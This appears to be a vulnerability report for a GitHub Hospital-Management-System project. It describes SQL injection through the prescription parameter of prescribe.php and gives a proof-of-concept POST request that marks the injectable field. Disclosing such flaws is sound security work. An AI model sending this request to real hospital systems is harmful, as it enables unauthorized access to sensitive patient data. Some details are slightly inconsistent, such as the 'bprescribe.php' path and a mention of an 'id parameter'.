# ponaravindb/Hospital-Management-System has sql injection in /prescribe.php

## supplier 

https://github.com/ponaravindb/Hospital-Management-System

## Vulnerability parameter

/ponaravind/Hospital-Management-System/bprescribe.php and $prescription

## describe

An unrestricted SQL injection attack exists in github-ponaravindb-Hospital-Management-System in prescribe.php. The parameters that can be controlled are as follows: $prescription. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the value of $prescription parameter is obtained in prescribe.php. , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/3816a94a-3e6f-45af-8441-af8399af14f3)

![Image](https://github.com/user-attachments/assets/8f5cb045-2df7-4ae1-9490-f593c8a29bac)

![image-20250511003540676](sql94(未交).assets/image-20250511003540676.png)

## POC

```
POST /prescribe.php HTTP/1.1
Host: hospital-management-system-master
Content-Length: 101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://hospital-management-system-master
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://hospital-management-system-master/prescribe.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ntn1gorbau9lbhqd4u93p5j9d6
Connection: close

disease=11&allergy=1&prescription=1*&fname=&lname=&appdate=&apptime=&pid=&ID=&prescribe=Prescribe
```

![Image](https://github.com/user-attachments/assets/022d08c4-4a7f-47bd-b912-ecc324bda7e0)

**Result**

![Image](https://github.com/user-attachments/assets/9e023356-2a0b-42c5-b8b2-58f13793dc3d)

